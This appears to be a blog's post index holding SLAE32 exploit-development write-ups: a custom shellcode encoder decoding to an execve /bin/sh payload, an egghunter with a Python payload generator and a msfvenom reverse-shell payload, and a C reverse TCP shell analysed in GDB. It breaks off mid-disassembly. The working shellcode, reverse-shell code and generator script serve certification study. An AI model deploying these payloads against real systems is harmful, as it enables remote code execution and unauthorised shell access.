0xc0,0x31,0x7f,0x68,0x50,0x7f,0x2f,0x2f,0x7f,0x68,0x73,0x7f,0x2f,0x68,0x7f,0x69,0x62,0x7f,0x89,0x6e,0x7f,0x50,0xe3,0x7f,0xe2,0x89,0x7f,0x89,0x53,0x7f,0xb0,0xe1,0x7f,0xcd,0x0b,0x7f,0x7f,0x80,0x7fCompiling, testing, and emmiting shellcode for use[sengen@manjaro-x86 /]$ nasm -f elf32 ./swapsert-decoder.nasm -o swapsert-decoder.o[sengen@manjaro-x86 /]$ ld -z execstack -N ./swapsert-decoder.o -o swapsert-decoderExecute our assembly code to ensure we get our bash shell[sengen@manjaro-x86 /]$ ./swapsert-decodersh-4.4$We can now extract the shellcode bytes for use in our test C program[sengen@manjaro-x86 /]$ objdump -d ./swapsert-decoder|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed &#39;s/$/&quot;/g&#39;&quot;\\xeb\\x28\\x5e\\x31\\xdb\\x31\\xc9\\xf7\\xe1\\x89\\xf7\\xb1\\x02\\x80\\x3c\\x0e\\x7f\\x75\\x15\\x8a\\x44\\x0e\\xfe\\x8a\\x5c\\x0e\\xff\\x88\\x1f\\x88\\x47\\x01\\x83\\xc1\\x03\\x83\\xc7\\x02\\xeb\\xe5\\xeb\\x05\\xe8\\xd3\\xff\\xff\\xff\\xc0\\x31\\x7f\\x68\\x50\\x7f\\x2f\\x2f\\x7f\\x68\\x73\\x7f\\x2f\\x68\\x7f\\x69\\x62\\x7f\\x89\\x6e\\x7f\\x50\\xe3\\x7f\\xe2\\x89\\x7f\\x89\\x53\\x7f\\xb0\\xe1\\x7f\\xcd\\x0b\\x7f\\x7f\\x80\\x7f&quot;Add our shellcode to our test C program and ensure it runs#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;unsigned char code[] = \\&quot;\\xeb\\x28\\x5e\\x31\\xdb\\x31\\xc9\\xf7\\xe1\\x89\\xf7\\xb1\\x02\\x80\\x3c\\x0e\\x7f\\x75\\x15\\x8a\\x44\\x0e\\xfe\\x8a\\x5c\\x0e\\xff\\x88\\x1f\\x88\\x47\\x01\\x83\\xc1\\x03\\x83\\xc7\\x02\\xeb\\xe5\\xeb\\x05\\xe8\\xd3\\xff\\xff\\xff\\xc0\\x31\\x7f\\x68\\x50\\x7f\\x2f\\x2f\\x7f\\x68\\x73\\x7f\\x2f\\x68\\x7f\\x69\\x62\\x7f\\x89\\x6e\\x7f\\x50\\xe3\\x7f\\xe2\\x89\\x7f\\x89\\x53\\x7f\\xb0\\xe1\\x7f\\xcd\\x0b\\x7f\\x7f\\x80\\x7f&quot;;main(){ printf(&quot;Shellcode Length: %d\\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret();}[sengen@manjaro-x86 /]$ ./shellcodeShellcode Length: 86sh-4.4$Watching the stack in GDBAfter esp is popped into esi (our encoded shellcode)gdb$ x/40c $esi0x40206f &amp;lt;code+47&amp;gt;: 0xc0 0x31 0x7f 0x68 0x50 0x7f 0x2f 0x2f0x402077 &amp;lt;code+55&amp;gt;: 0x7f 0x68 0x73 0x7f 0x2f 0x68 0x7f 0x690x40207f &amp;lt;code+63&amp;gt;: 0x62 0x7f 0x89 0x6e 0x7f 0x50 0xe3 0x7f0x402087 &amp;lt;code+71&amp;gt;: 0xe2 0x89 0x7f 0x89 0x53 0x7f 0xb0 0xe10x40208f &amp;lt;code+79&amp;gt;: 0x7f 0xcd 0xb 0x7f 0x7f 0x80 0x7f 0x0After first swapThe first and second bytes (0xc0 and 0x31) have been swapped.gdb$ x/40c $esi0x40206f &amp;lt;code+47&amp;gt;: 0x31 0xc0 0x7f 0x68 0x50 0x7f 0x2f 0x2f0x402077 &amp;lt;code+55&amp;gt;: 0x7f 0x68 0x73 0x7f 0x2f 0x68 0x7f 0x690x40207f &amp;lt;code+63&amp;gt;: 0x62 0x7f 0x89 0x6e 0x7f 0x50 0xe3 0x7f0x402087 &amp;lt;code+71&amp;gt;: 0xe2 0x89 0x7f 0x89 0x53 0x7f 0xb0 0xe10x40208f &amp;lt;code+79&amp;gt;: 0x7f 0xcd 0xb 0x7f 0x7f 0x80 0x7f 0x0After second swapThe 4th and 5th bytes (0x68 and 0x50) have been swapped and placed into the 3rd and 4th byte position overwriting the 0x7f. This process of swapping bytes and moving them back against the rest of the shellcode overwriting the 0x7f bytes will continue until the end.gdb$ x/40c $esi0x40206f &amp;lt;code+47&amp;gt;: 0x31 0xc0 0x50 0x68 0x50 0x7f 0x2f 0x2f0x402077 &amp;lt;code+55&amp;gt;: 0x7f 0x68 0x73 0x7f 0x2f 0x68 0x7f 0x690x40207f &amp;lt;code+63&amp;gt;: 0x62 0x7f 0x89 0x6e 0x7f 0x50 0xe3 0x7f0x402087 &amp;lt;code+71&amp;gt;: 0xe2 0x89 0x7f 0x89 0x53 0x7f 0xb0 0xe10x40208f &amp;lt;code+79&amp;gt;: 0x7f 0xcd 0xb 0x7f 0x7f 0x80 0x7f 0x0After last swapThe final bytes are now from 0x40206f to the first byte at 0x402087 (0x80). The rest of the bytes after this are now junk and was the extra space the encoded shellcode was using up due to the 0x7f we’ve been overwriting.gdb$ x/40c $esi0x40206f &amp;lt;code+47&amp;gt;: 0x31 0xc0 0x50 0x68 0x2f 0x2f 0x73 0x680x402077 &amp;lt;code+55&amp;gt;: 0x68 0x2f 0x62 0x69 0x6e 0x89 0xe3 0x500x40207f &amp;lt;code+63&amp;gt;: 0x89 0xe2 0x53 0x89 0xe1 0xb0 0xb 0xcd0x402087 &amp;lt;code+71&amp;gt;: 0x80 0x7f 0x7f 0x89 0x53 0x7f 0xb0 0xe10x40208f &amp;lt;code+79&amp;gt;: 0x7f 0xcd 0xb 0x7f 0x7f 0x80 0x7f 0x0Finally we jump to the decoded shellcode to execute it.When you compare this to the original shellcode we started with to encode you’ll see we have turned it back into the same.=&amp;gt; 0x0040206f &amp;lt;+47&amp;gt;: xor eax,eax 0x00402071 &amp;lt;+49&amp;gt;: push eax 0x00402072 &amp;lt;+50&amp;gt;: push 0x68732f2f 0x00402077 &amp;lt;+55&amp;gt;: push 0x6e69622f 0x0040207c &amp;lt;+60&amp;gt;: mov ebx,esp 0x0040207e &amp;lt;+62&amp;gt;: push eax 0x0040207f &amp;lt;+63&amp;gt;: mov edx,esp 0x00402081 &amp;lt;+65&amp;gt;: push ebx 0x00402082 &amp;lt;+66&amp;gt;: mov ecx,esp 0x00402084 &amp;lt;+68&amp;gt;: mov al,0xb 0x00402086 &amp;lt;+70&amp;gt;: int 0x80Source codeAll source code for this assignment can be found at https://github.com/tdmathison/SLAE32/tree/master/assignment4." }, { "title": "SLAE32: Implementing an x86/Linux Egghunter", "url": "/posts/slae32-3/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, egghunter, slae32", "date": "2018-01-05 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #3Goals Explain what an egghunter is Create a working demo Configurable: Be able to specify the egg value and second stage payload The egghunter shellcode will be generated to search for this egg Two shellcodes are emmitted; one for the egghunter and one for the second stage payload prefixed with the egg What is an egghunter?An egghunter is shellcode that crawls the processes Virtual Address Space (VAS) for another piece of shellcode to execute. The search by default would occur from the location of the egghunter code onward searching each byte for a 4 or 8 byte “egg” to indicate where the next payload to execute is at.The egghunter technique is used when there is not enough room for a full payload in the space that was exploitable in the application. Further, there must be some way to inject the second stage payload into the applications memory space. This could be through an additional header if it was a web request, or it could be simply making another call to a command somewhere else in the application where the data was persisted in memory.In all cases, this means that in our exploit where we took control of EIP there was not a way to jump to the suitable location.Existing egghuntersA well-known writeup on creating egghunters is by Skape at http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf and it is a popular read for those interested in implementing an egghunter. The focus of this post is on the x86/Linux egghunters only.There are two important things for an egghunter to function properly: It must find our shellcode wherever it is in memory and run it It must avoid crashing due to unreadable memory locations, that is, it must check whether it has access to each block of memory before testing it for the egg bytesConditions of the eggSizeThe egg can be either 4 or 8 bytes and it seems the best size is 8 bytes. The primary reasoning behind this which makes the most sense is that the egghunter shellcode will have the first 4 bytes in it since it needs to search for the egg. If the egghunter ends up running into itself it can incorrectly believe it has found the egg when it has not.The egg should be the same 4 bytes duplicated.valueA standard value used is 57303054 but other values such as 90509050 are also used. The main consideration is using something that is unlikely to be present in the actual program as well as something that has benign instructions associated with it. Depending on the egghunter it may end up executing the instructions or may jump over it completely.Both of these could run without causing much problem as they only contain pushes, NOP’s, and a XOR. If jumps or other instructions were generated it could be problematic.EGG = 573030540: 57 push edi1: 30 30 xor BYTE PTR [eax],dh3: 54 push espEGG = 905090500: 90 nop1: 50 push eax2: 90 nop3: 50 push eaxImplementationSince there are highly optimized versions of the egghunter available we’ll focus on analyzing one that is best used for our situation and understand each line of assembly. We will then create a working demo of the egghunter and see it actually work in practice.The following implementation utilizes the access system call to determine if a block of memory is invalid or not. This implementation also does not execute the egg instructions so that is not a concern either.00000000 31D2 xor edx,edx00000002 6681CAFF0F or dx,0xfff00000007 42 inc edx00000008 8D5A04 lea ebx,[edx+0x4]0000000B 6A21 push byte +0x210000000D 58 pop eax0000000E CD80 int 0x8000000010 3CF2 cmp al,0xf200000012 74EE jz 0x200000014 B890509050 mov eax,0x5090509000000019 89D7 mov edi,edx0000001B AF scasd0000001C 75E9 jnz 0x70000001E AF scasd0000001F 75E6 jnz 0x700000021 FFE7 jmp ediBreaking down the assemblyThe edx register is zeroed out as it will be tracking the memory locations that we’ll be comparing our egg with. When we find it we will jump to EDI where the shellcode should reside.00000000 31D2 xor edx,edxThe next two instructions will allow us to move up a full PAGE_SIZE. When we check for access, it will apply for the entire memory segment so if it fails then there is no need to continue check bytes. On my system, I checked the page size via the command getconf PAGE_SIZE which yielded 4096 which is why 0xfff would make sense.00000002 6681CAFF0F or dx,0xfff00000007 42 inc edxWe are loading the effective address of edx plus 4 bytes into ebx. This is in preparation of the upcoming access check which will be performed against this memory location.00000008 8D5A04 lea ebx,[edx+0x4]The system call for access is 33 so the hex conversion of this is 0x21 of which we push to the stack and immediately pop back onto eax to prepare for the system call.0000000B 6A21 push byte +0x210000000D 58 pop eax0000000E CD80 int 0x80The result of the access check is compared with 0xf2 which is the low byte of the EFAULT return value (the address points outside of the accessible address space). If the value matches then we don’t have access to this memory page and should skip over it; thus we jump back to the second instruction of the egghunter which moves us a page ahead.00000010 3CF2 cmp al,0xf200000012 74EE jz 0x2At this point we load the egg value into eax, and move edx into edi (which allows for the use of the scasd instruction which compares eax with dword at edi then set status flags).00000014 B890509050 mov eax,0x5090509000000019 89D7 mov edi,edx0000001B AF scasdIf there is no match then it jumps back to increment edx to check the next the next 4 bytes. If it does match then it does a second check of the next 4 bytes after the match to see if we have the full 8 byte egg.0000001C 75E9 jnz 0x70000001E AF scasd0000001F 75E6 jnz 0x7Finally, upon a successful match, edi should be now pointing to the first byte of the second stage payload. We jump to that location to allow execution of the second stage payload.00000021 FFE7 jmp ediCreating a working demoI have re-written the egghunter to have labels to jump to when we move to next memory page or next byte. An objdump of the assembly is shown below:egghunter: file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;gt;: 8048060: 31 d2 xor edx,edx08048062 &amp;lt;next_page&amp;gt;: 8048062: 66 81 ca ff 0f or dx,0xfff08048067 &amp;lt;next_byte&amp;gt;: 8048067: 42 inc edx 8048068: 8d 5a 04 lea ebx,[edx+0x4] 804806b: 6a 21 push 0x21 804806d: 58 pop eax 804806e: cd 80 int 0x80 8048070: 3c f2 cmp al,0xf2 8048072: 74 ee je 8048062 &amp;lt;next_page&amp;gt; 8048074: b8 90 50 90 50 mov eax,0x50905090 8048079: 89 d7 mov edi,edx 804807b: af scas eax,DWORD PTR es:[edi] 804807c: 75 e9 jne 8048067 &amp;lt;next_byte&amp;gt; 804807e: af scas eax,DWORD PTR es:[edi] 804807f: 75 e6 jne 8048067 &amp;lt;next_byte&amp;gt; 8048081: ff e7 jmp ediWe can save this as exploit ready hex and define where the 4 byte “egg” is located for configurability later.[sengen@manjaro-x86 assignment3]$ objdump -d ./egghunter|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\\t&#39; &#39; &#39;|sed &#39;s/ $//g&#39;|sed &#39;s/ /\\\\x/g&#39;|paste -d &#39;&#39; -s |sed &#39;s/^/&quot;/&#39;|sed &#39;s/$/&quot;/g&#39;&quot;\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8\\x90\\x50\\x90\\x50\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7&quot;Python script to help generate egghunter+payloadSo we can now write a quick python program to take in the egg value and any given payload and emmit the two formatted hex strings that can be used in an exploit.#!/usr/bin/pythonfrom optparse import OptionParserdef to_hex(val): return &#39;&#39;.join(&#39;\\\\x&#39; + val[i:i + 2] for i in range(0, len(val), 2))parser = OptionParser()parser.description = &quot;Generates egghunter shellcode with payload.&quot;parser.add_option(&quot;-e&quot;, &quot;--egg&quot;, dest=&quot;egg&quot;, help=&quot;The 4 byte egg to use (e.g. 90509050)&quot;, type=&quot;string&quot;)parser.add_option(&quot;-p&quot;, &quot;--payload&quot;, dest=&quot;payload&quot;, help=&quot;Payload shellcode (e.g. \\\\x31\\\\xc0\\\\...)&quot;, type=&quot;string&quot;)(options, args) = parser.parse_args()if not options.egg or not options.payload: parser.print_help() exit(1)if not len(options.egg) == 8: print(&quot;Invalid egg size&quot;) exit(1)egghunter = ( &quot;\\\\x31\\\\xd2\\\\x66\\\\x81\\\\xca\\\\xff\\\\x0f\\\\x42\\\\x8d\\\\x5a\\\\x04\\\\x6a\\\\x21\\\\x58\\\\xcd\\\\x80\\\\x3c\\\\xf2\\\\x74\\\\xee\\\\xb8&quot; + to_hex(options.egg) + &quot;\\\\x89\\\\xd7\\\\xaf\\\\x75\\\\xe9\\\\xaf\\\\x75\\\\xe6\\\\xff\\\\xe7&quot;)payload = (to_hex(options.egg) + to_hex(options.egg) + options.payload)print(&quot;\\nEgghunter = \\&quot;&quot; + egghunter + &quot;\\&quot;&quot;)print(&quot;Payload = \\&quot;&quot; + payload + &quot;\\&quot;\\n&quot;)Generating payload to test scriptroot@sengen-kali2:~# msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.122 lport=443 -f pythonNo platform was selected, choosing Msf::Module::Platform::Linux from the payloadNo Arch selected, selecting Arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 68 bytesFinal size of python file: 342 bytesbuf = &quot;&quot;buf += &quot;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66&quot;buf += &quot;\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0&quot;buf += &quot;\\xa8\\x01\\x7a\\x68\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50&quot;buf += &quot;\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73&quot;buf += &quot;\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0&quot;buf += &quot;\\x0b\\xcd\\x80&quot;[sengen@manjaro-x86 assignment3]$ python create_egg_hunter.py -e 90509050 -p &quot;\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x7a\\x68\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;Egghunter = &quot;\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8\\x90\\x50\\x90\\x50\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7&quot;Payload = &quot;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x7a\\x68\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;Testing in a C programFrom the output of our script we can add it to a small C program to execute the egghunter shellcode. Since the payload is also defined as a variable it will be stored somewhere in memory for the egghunter to find.[sengen@manjaro-x86 assignment3]$ gcc shellcode.c -o shellcode#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;main(){ char egghunter[] = &quot;\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x6a\\x21\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8\\x90\\x50\\x90\\x50\\x89\\xd7\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7&quot;; char payload[] = &quot;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\xc0\\xa8\\x01\\x7a\\x68\\x02\\x00\\x01\\xbb\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;; int (*ret)() = (int(*)())egghunter; ret();}Gaining shellExecuting shellcode program that initiates the egghunterReceiving shell on remote Linux machine" }, { "title": "SLAE32: Creating Reverse TCP Shellcode", "url": "/posts/slae32-2/", "categories": "SLAE32", "tags": "assembly, x86, penetration-testing, hacking, exploit-development, shellcode, slae32", "date": "2018-01-04 11:00:00 -0800", "snippet": "The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-990Assignment #2Goals Explain the process of how to create Reverse TCP Shell shellcode The shellcode should: Reverse connects to configured IP and Port Execs shell on incoming connection The IP address and port number should be easily configurable PhasesTo accomplish this I’m going to split this into four phases: Understand the system calls made by creating and analyzing a C program written by reading the linux programmers documentation that would behave the same way. Debug the C program to figure out how parameters are being passed around in memory or through registers to make it work. Writing assembly that can be used as shellcode that does the same thing (meaning it must at least not have any null bytes while still being functional). Write a wrapper python script that lets you specify a port and it will emmit the full shellcode ready for use.Phase 1: Writing a Reverse TCP shell in CJust as with the TCP Bind shell research (which you can read here =&amp;gt; SLAE32: Creating TCP Bind Shellcode) I read up on what system calls are required to reverse connect back out to an IP address and port.It appears that the reverse shell should be simpler than the bind shell. The procedure for making the connection should look similar to:socket-&amp;gt;connect-&amp;gt;dup2-&amp;gt;dup2-&amp;gt;dup2-&amp;gt;execveThe prototypes of the functions that we will want to call are in the following order below (with the man page link referenced):/* http://man7.org/linux/man-pages/man2/socket.2.html */int socket(int domain, int type, int protocol);/* http://man7.org/linux/man-pages/man2/connect.2.html */int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);/* http://man7.org/linux/man-pages/man2/dup.2.html */int dup2(int oldfd, int newfd);/* http://man7.org/linux/man-pages/man2/execve.2.html */int execve(const char *filename, char *const argv[], char *const envp[]);I wrote the following C program that creates this reverse shell and compiled and ran it to confirm it functions properly.#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;sys/socket.h&amp;gt;#include &amp;lt;netinet/in.h&amp;gt;#define NULL 0int socket(int domain, int type, int protocol);int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);int dup2(int oldfd, int newfd);int execve(const char *filename, char *const argv[], char *const envp[]);int close(int fd);int main() { char* address = &quot;192.168.1.122&quot;; int port = 6789; /* this creates a new socket but it has no address assigned to it yet */ int sockfd = socket(AF_INET /* 2 */, SOCK_STREAM /* 1 */, 0); /* create sockaddr_in structure for use with connect function */ struct sockaddr_in sock_in; sock_in.sin_family = AF_INET; sock_in.sin_addr.s_addr = inet_addr(address); sock_in.sin_port = htons(port); /* perform connect to target IP address and port */ connect(sockfd, (struct sockaddr*)&amp;amp;sock_in, sizeof(struct sockaddr_in)); /* duplicate file descriptors for STDIN/STDOUT/STDERR */ for (int n = 0; n &amp;lt;= 2; ++n) { dup2(sockfd, n); } /* execute /bin/sh */ execve(&quot;/bin/sh&quot;, NULL, NULL); close(sockfd); return 0;}Using netcat to listen on port 6789Building and running reverse shellReceiving reverse shellPhase 2: Understanding how parameters are passed around using strace and GDBThe idea of debugging this was to set a breakpoint at each system call and analyze the registers and stack to see what is needed at the point of the call. With this information we can then come up with our own way to get the same values setup properly in a shellcode safe manner.We can get a quick view of the calls with strace as seen here (this is useful and is helpful when looking at the assembly dump in GDB). In most cases, you can see the value of each parameter that was used to the function calls which would be either on the stack or in one of the registers. In the case of a parameter value that is enclosed in curly braces {} this is likely a pointer to a struct that resides on the stack.[sengen@manjaro-x86 assignment2]$ strace -e socket,connect,dup2,execve ./rev_shellexecve(&quot;./rev_shell&quot;, [&quot;./rev_shell&quot;], 0xbfd4efe8 /* 55 vars */) = 0socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3connect(3, {sa_family=AF_INET, sin_port=htons(6789), sin_addr=inet_addr(&quot;192.168.1.122&quot;)}, 16) = 0dup2(3, 0) = 0dup2(3, 1) = 1dup2(3, 2) = 2execve(&quot;/bin/sh&quot;, NULL, NULL) = 0socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4connect(4, {sa_family=AF_UNIX, sun_path=&quot;/var/run/nscd/socket&quot;}, 110) = -1 ENOENT (No such file or directory)socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4connect(4, {sa_family=AF_UNIX, sun_path=&quot;/var/run/nscd/socket&quot;}, 110) = -1 ENOENT (No such file or directory)--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=31304, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---+++ exited with 0 +++The following is the dump of the main function. I put breakpoints before each function call I was interested in and printed the relevant register or stack information for use when I write my shellcode.gdb$ disassemble mainDump of assembler code for function main: 0x0040068d &amp;lt;+0&amp;gt;: lea ecx,[esp+0x4] 0x00400691 &amp;lt;+4&amp;gt;: and esp,0xfffffff0 0x00400694 &amp;lt;+7&amp;gt;: push DWORD PTR [ecx-0x4] 0x00400697 &amp;lt;+10&amp;gt;: push ebp 0x00400698 &amp;lt;+11&amp;gt;: mov ebp,esp 0x0040069a &amp;lt;+13&amp;gt;: push ebx 0x0040069b &amp;lt;+14&amp;gt;: push ecx 0x0040069c &amp;lt;+15&amp;gt;: sub esp,0x30 0x0040069f &amp;lt;+18&amp;gt;: call 0x400590 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x004006a4 &amp;lt;+23&amp;gt;: add ebx,0x195c 0x004006aa &amp;lt;+29&amp;gt;: mov eax,gs:0x14 0x004006b0 &amp;lt;+35&amp;gt;: mov DWORD PTR [ebp-0xc],eax 0x004006b3 &amp;lt;+38&amp;gt;: xor eax,eax 0x004006b5 &amp;lt;+40&amp;gt;: lea eax,[ebx-0x17cc] 0x004006bb &amp;lt;+46&amp;gt;: mov DWORD PTR [ebp-0x28],eax 0x004006be &amp;lt;+49&amp;gt;: mov DWORD PTR [ebp-0x24],0x1a85 0x004006c5 &amp;lt;+56&amp;gt;: sub esp,0x4 ; socket -------------------------------------------------------------------------- 0x004006c8 &amp;lt;+59&amp;gt;: push 0x0 0x004006ca &amp;lt;+61&amp;gt;: push 0x1 0x004006cc &amp;lt;+63&amp;gt;: push 0x2 0x004006ce &amp;lt;+65&amp;gt;: call 0x400500 &amp;lt;socket@plt&amp;gt; ; gdb$ x/3w $esp ; 0xbffff010: 0x00000002 0x00000001 0x00000000 ; ; parameters: ; 0x00000002 = AF_INET ; 0x00000001 = SOCK_STREAM ; 0x00000000 = IPPROTO_IP ; --------------------------------------------------------------------------------- ; connect ------------------------------------------------------------------------- 0x004006d3 &amp;lt;+70&amp;gt;: add esp,0x10 0x004006d6 &amp;lt;+73&amp;gt;: mov DWORD PTR [ebp-0x20],eax 0x004006d9 &amp;lt;+76&amp;gt;: mov WORD PTR [ebp-0x1c],0x2 0x004006df &amp;lt;+82&amp;gt;: sub esp,0xc 0x004006e2 &amp;lt;+85&amp;gt;: push DWORD PTR [ebp-0x28] 0x004006e5 &amp;lt;+88&amp;gt;: call 0x400510 &amp;lt;inet_addr@plt&amp;gt; 0x004006ea &amp;lt;+93&amp;gt;: add esp,0x10 0x004006ed &amp;lt;+96&amp;gt;: mov DWORD PTR [ebp-0x18],eax 0x004006f0 &amp;lt;+99&amp;gt;: mov eax,DWORD PTR [ebp-0x24] 0x004006f3 &amp;lt;+102&amp;gt;: movzx eax,ax 0x004006f6 &amp;lt;+105&amp;gt;: sub esp,0xc 0x004006f9 &amp;lt;+108&amp;gt;: push eax 0x004006fa &amp;lt;+109&amp;gt;: call 0x4004d0 &amp;lt;htons@plt&amp;gt; 0x004006ff &amp;lt;+114&amp;gt;: add esp,0x10 0x00400702 &amp;lt;+117&amp;gt;: mov WORD PTR [ebp-0x1a],ax 0x00400706 &amp;lt;+121&amp;gt;: sub esp,0x4 0x00400709 &amp;lt;+124&amp;gt;: push 0x10 0x0040070b &amp;lt;+126&amp;gt;: lea eax,[ebp-0x1c] 0x0040070e &amp;lt;+129&amp;gt;: push eax 0x0040070f &amp;lt;+130&amp;gt;: push DWORD PTR [ebp-0x20] 0x00400712 &amp;lt;+133&amp;gt;: call 0x400520 &amp;lt;connect@plt&amp;gt; ; gdb$ x/3w $esp ; 0xbffff010: 0x00000003 0xbffff03c 0x00000010 ; ; parameters: ; 0x00000003 = sockfd ; 0xbffff03c = address of sockaddr struct ; ; gdb$ x/8c 0xbffff03c ; 0xbffff03c: 0x2 0x0 0x1a 0x85 0xc0 0xa8 0x1 0x7a ; ; parameters: ; 0x2 0x0 = AF_INET ; 0x1a 0x85 = Port number (6789) ; 0xc0 0xa8 0x1 0x7a = IPv4 address (192.168.1.122) gdb$ x/13b $ebp-0x180xbffff030: 0xc0 0xa8 0x01 0x7a 0xf4 0xf0 0xff 0xbf0xbffff038: 0xfc 0xf0 0xff 0xbf 0x00 ; --------------------------------------------------------------------------------- ; dup2 ---------------------------------------------------------------------------- 0x00400717 &amp;lt;+138&amp;gt;: add esp,0x10 0x0040071a &amp;lt;+141&amp;gt;: mov DWORD PTR [ebp-0x2c],0x0 0x00400721 &amp;lt;+148&amp;gt;: jmp 0x400738 &amp;lt;main+171&amp;gt; 0x00400723 &amp;lt;+150&amp;gt;: sub esp,0x8 0x00400726 &amp;lt;+153&amp;gt;: push DWORD PTR [ebp-0x2c] 0x00400729 &amp;lt;+156&amp;gt;: push DWORD PTR [ebp-0x20] 0x0040072c &amp;lt;+159&amp;gt;: call 0x4004c0 &amp;lt;dup2@plt&amp;gt; ; gdb$ x/2w $esp ; 0xbffff010: 0x00000003 0x00000000 ; gdb$ x/2w $esp ; 0xbffff010: 0x00000003 0x00000001 ; gdb$ x/2w $esp ; 0xbffff010: 0x00000003 0x00000002 ; ; parameters: ; 0x00000003 = oldfd ; 0x0000000[0-2] = newfd ; --------------------------------------------------------------------------------- ; execve -------------------------------------------------------------------------- 0x00400731 &amp;lt;+164&amp;gt;: add esp,0x10 0x00400734 &amp;lt;+167&amp;gt;: add DWORD PTR [ebp-0x2c],0x1 0x00400738 &amp;lt;+171&amp;gt;: cmp DWORD PTR [ebp-0x2c],0x2 0x0040073c &amp;lt;+175&amp;gt;: jle 0x400723 &amp;lt;main+150&amp;gt; 0x0040073e &amp;lt;+177&amp;gt;: sub esp,0x4 0x00400741 &amp;lt;+180&amp;gt;: push 0x0 0x00400743 &amp;lt;+182&amp;gt;: push 0x0 0x00400745 &amp;lt;+184&amp;gt;: lea eax,[ebx-0x17be] 0x0040074b &amp;lt;+190&amp;gt;: push eax 0x0040074c &amp;lt;+191&amp;gt;: call 0x4004f0 &amp;lt;execve@plt&amp;gt; ; gdb$ x/a $esp ; 0xbffff010: 0x400842 =&amp;gt; &quot;/bin/sh&quot; ; gdb$ x/2c $esp+4 ; 0xbffff014: 0x0 0x0 ; ; parameters: ; 0x4008a4 